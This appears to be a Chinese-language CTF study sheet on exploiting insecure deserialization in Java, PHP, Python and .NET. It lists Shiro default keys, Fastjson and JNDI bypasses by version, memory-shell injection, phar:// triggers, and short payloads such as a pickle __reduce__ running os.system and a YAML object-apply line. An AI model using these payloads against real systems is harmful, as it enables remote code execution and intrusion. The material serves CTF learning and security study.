# 反序列化判据库

> 来源：107 篇涉及反序列化的赛题 WP 提炼（468 条观测 / 305 条失败尝试），
> 加上主库 `漏洞分类/反序列化/` 已有的内容，只保留**主库没有的新判据**。
> 用法：先看 §0 定入口类型，再按语言跳节。

## 0. 判据速查

| 现象 | 判据 | 去哪节 |
|---|---|---|
| 流量/参数里有 `rO0AB` / `aced0005` | Java 原生序列化 | §1 |
| Cookie 名是 `rememberMe`，值 base64 | Shiro，先试默认密钥 | §1.2 |
| JSON body 里有 `@type` | Fastjson，先试 1.2.24 无限制 | §1.3 |
| 参数是 `O:4:"User":2:{...}` | PHP，看魔术方法接力 | §2 |
| 只有 `file_exists`/`getimagesize`，无 `unserialize` | `phar://` 可触发 | §2.3 |
| Cookie 是 Flask session（base64 + `.` 分段） | 先爆破 `SECRET_KEY` | §3.1 |
| 有 `pickle.loads` 或 `yaml.load` | Python，直接 `__reduce__` | §3 |
| `TypeNameHandling=All` / `$type` | Json.NET | §4 |
| 反序列化点找到了但打不通 | 先判「出口」是否可达（出网/写文件/反射） | §5 |

## 1. Java

**判据**：字节流以 `AC ED 00 05` 开头（base64 后 `rO0AB`）。或 `Content-Type: application/x-java-serialized-object`。

### 1.1 链的可得性判据

Java 反序列化不是「有链就能打」，要先判**目标 classpath 里有什么**：

```text
有 commons-collections 3.x     → CC1/CC3/CC5/CC6/CC7
有 commons-collections 4.x     → CC2/CC4（需 javassist）
有 c3p0                        → HexAsciiSerializedMap + JDBC
有 Spring                      → Spring1/Spring2、Jdk7u21
有 Shiro                       → Shiro-550（默认密钥）/ Shiro-721（Padding Oracle）
有 fastjson                    → autoType 绕过链
都没有                          → TemplatesImpl + TiedMapEntry + LazyMap（cc11 思路）
```

判据是**依赖版本**，不是「有没有 CC」。用 `ysoserial` 时链选错的表现是「反序列化成功但没执行」，不是报错。

### 1.2 Shiro 的两个洞要分清

| 编号 | 条件 | 特征 |
|---|---|---|
| Shiro-550 | `rememberMe` 的 AES 密钥是硬编码默认值 | 直接加密 payload 即可 |
| Shiro-721 | 密钥已改，但 CBC 模式可 Padding Oracle | 需要几百次请求爆破 |

判据是**先试 550 的默认密钥表**（`kPH+bIxk5D2deZiIxcaaaA==` 等），通了就不用打 721。默认密钥表在 `shiro-default-keys.txt`。

### 1.3 Fastjson 的版本分水岭

```text
< 1.2.24          → 直接 @type 打 JdbcRowSetImpl
1.2.25 – 1.2.41   → @type 前加 L / [ 绕过
1.2.42            → 双写 LL 绕过
1.2.43 – 1.2.47   → 用 java.lang.Class 缓存绕过
1.2.48 – 1.2.68   → 找不在黑名单的类（expectClass 绕过）
1.2.69 – 1.2.80   → 需配合 autoType 开启 + 特定 gadget
> 1.2.80          → 基本只能靠「应用自己开了 autoType」或二次反序列化
```

判据是**报错信息里的版本号**，或 `Content-Type` 后的 `fastjson` 字样。打之前必须先确认版本，否则会浪费大量轮次试无效 payload。

**坑**：`1.2.80` 禁了 `FileOutputStream`，但如果应用自定义了 `FilterFileOutputStream`，可以借 `sun.rmi.server.MarshalOutputStream` 绕过。判据是**应用代码里有自定义流类**。

### 1.4 JNDI 的三个时代

```text
JDK < 8u191        → 远程 codebase 直接加载（LDAP/RMI 都行）
8u191 – 8u201      → 需 trustURLCodebase=true，改走本地 gadget
> 8u201            → 只能靠本地 factory（Tomcat BeanFactory / Groovy / XBean）
```

判据是**JDK 版本**。高版本下 `JNDI + LDAP` 不是不通，是**必须用本地 factory 类**——`org.apache.naming.factory.BeanFactory` 是最常用的一个。

### 1.5 内存马注册

无文件落地的场景：

```java
// Spring：反射拿 RequestMappingHandlerMapping 注册
// Tomcat：反射拿 StandardContext 的 filterConfigs 塞 FilterDef
// 通用：Java Agent 的 agentmain 钩 socket
```

判据是**能执行一次任意代码，但不能再写文件**。内存马是「已经 RCE 之后如何维持」的手段，不是入口。

## 2. PHP

**判据**：`O:N:"Class":N:{...}` 格式，或 `a:N:{...}`。base64 编码后仍是这个形态。

### 2.1 链的构造（不背链，背接力）

```text
入口：__destruct（对象销毁） / __wakeup（反序列化时） / __construct（新建时）
   ↓ 该魔术方法里访问了某个属性
中间：__toString（被当字符串） / __invoke（被当函数） / __get（读不存在的属性）
   ↓ 该魔术方法里调用了某个方法
出口：__call（调不存在的方法） / 直接 system/eval/file_put_contents
```

判据是**每一环的返回值类型能喂给下一环**。断链就换入口，不要硬凑。

### 2.2 `__wakeup` 与 `__unserialize`

| 版本 | 绕过方式 |
|---|---|
| PHP < 7.4.28 | `O:1:"A":2:{...}` 属性数不匹配，`__wakeup` 不执行 |
| PHP ≥ 7.4.28 | 改 `O:` 为 `C:`，触发 `__unserialize`（需类实现 `Serializable`） |
| 两者都不行 | 找 `__destruct` 入口，绕开 `__wakeup` 所在的类 |

### 2.3 `phar://` 的完整触发面

```text
file_exists   file_get_contents   file_put_contents   fopen
stat          getimagesize        exif_read_data      finfo_file
md5_file      is_file             is_dir              copy
rename        scandir             unlink              parse_ini_file
```

判据是**上述任一函数 + 路径可控**。`phar` 文件改后缀为 `.jpg` 不影响（只认 stub），但**要能上传**。

**坑**：`phar://` 的 stub 必须是 `<?php __HALT_COMPILER(); ?>` 加至少一个文件。用 `phpggc` 生成最省事。

### 2.4 字符串逃逸

反序列化前有 `str_replace`/`preg_replace` 改变长度时：

```text
源码：$s = str_replace('x', 'yy', $_GET['d']); unserialize($s);
思路：每个 'x' 变长 1 字节，用多余的字节「吃掉」后面的结构
payload：在 s:N:"..." 的 N 上做文章，让长度字段覆盖到后面的引号
```

判据是**替换前后长度不等**。等长替换（`a`→`b`）不能逃逸。

### 2.5 原生类当 gadget

没有自定义类时，PHP 内置类也能用：

```php
// 列目录
new FilesystemIterator('glob:///f*')
// 读文件
new SplFileObject('/flag')
// 写文件
new SplFileObject('/var/www/html/shell.php', 'w')
// SSRF
new SoapClient(null, ['location'=>'http://...', 'uri'=>'http://...'])
```

判据是**代码里有 `new $this->a($this->b)` 这类动态实例化**。

## 3. Python

**判据**：Cookie 是 `base64(pickle)` 或 Flask 签名 session；或代码里有 `pickle.loads`/`yaml.load`/`jsonpickle`。

### 3.1 Flask session 伪造

```bash
# 先解码看结构
flask-unsign --decode --cookie '<cookie>'
# 再爆破密钥
flask-unsign --unsign --cookie '<cookie>' --wordlist rockyou.txt
# 拿到密钥后伪造
flask-unsign --sign --cookie "{'admin': True}" --secret '<key>'
```

判据是**session 是 Flask 默认格式**（`eyJ...` 开头，`.` 分三段）。密钥常来自源码、`.env`、`/proc/self/environ`。

**坑**：`SECRET_KEY` 若是 `random.seed(time)` 生成，可以按时间窗口还原，不用爆破。

### 3.2 `pickle` 的 `__reduce__`

```python
import pickle, os
class E:
    def __reduce__(self):
        return (os.system, ('cat /flag',))
pickle.dumps(E())
```

判据是**能控制 pickle 字节流**。黑名单绕过常用：

```python
# 显式 import 黑名单时，用等价模块
posix.system          # 等价 os.system
builtins.eval         # 大小写变体 b'BuIltIn'
```

### 3.3 `yaml.load` vs `yaml.safe_load`

```yaml
!!python/object/apply:os.system ['cat /flag']
```

判据是**用了 `yaml.load` 而不是 `safe_load`**（PyYAML ≥ 5.1 的 `load` 也默认安全，需显式 `Loader=yaml.Loader`）。

## 4. .NET

**判据**：JSON 里有 `$type`，或二进制流以 `AAEAAAD/////` 开头（base64 后）。

```text
Json.NET: TypeNameHandling != None 时可注入 $type
常用 gadget: ObjectDataProvider / TypeConfuseDelegate / ActivitySurrogateDisableTypeCheck
工具: ysoserial.net -g ObjectDataProvider -f Json.Net
```

判据是**反序列化配置里 `TypeNameHandling` 不是 `None`**。

## 5. 打不通时的排查顺序

按这个顺序查，不要乱试：

```text
1. 入口真的触发了？    → 放一个「必然报错」的 payload，看有没有异常
2. 链真的在 classpath？ → 报 NoClassDefFoundError 说明缺依赖
3. 出口可达？          → 出网被禁就换写文件/反射；写文件被禁就换内存马
4. 黑名单绕过了？      → 逐个试等价类（posix/os、大小写、双写）
5. 版本对得上？        → Fastjson/Shiro/JDK 每个版本绕过方式都不同
```

**最常见的浪费**：入口没触发就去调链。表现是「payload 发出去了，什么反应都没有」——这时候应该先确认入口，而不是换链。

## 6. 纪律

- **先判语言再判链**。看到 `rO0AB` 就去调 PHP 链是纯浪费。
- **先判版本再选 payload**。Fastjson/Shiro/JDK 的版本决定一切，不确认版本等于瞎打。
- **链不通就换入口，不要换链**。同一入口下的链通常是同一批依赖，换链大概率还是不通。
- **`phar://` 先确认能上传**。不能上传就别在这条路上耗。
- **内存马是后渗透手段**，不是入口。能 RCE 之后才谈维持。
- **不要背链名，背「魔术方法接力顺序」和「依赖→链」的映射**。链名换版本就变，映射关系稳定。
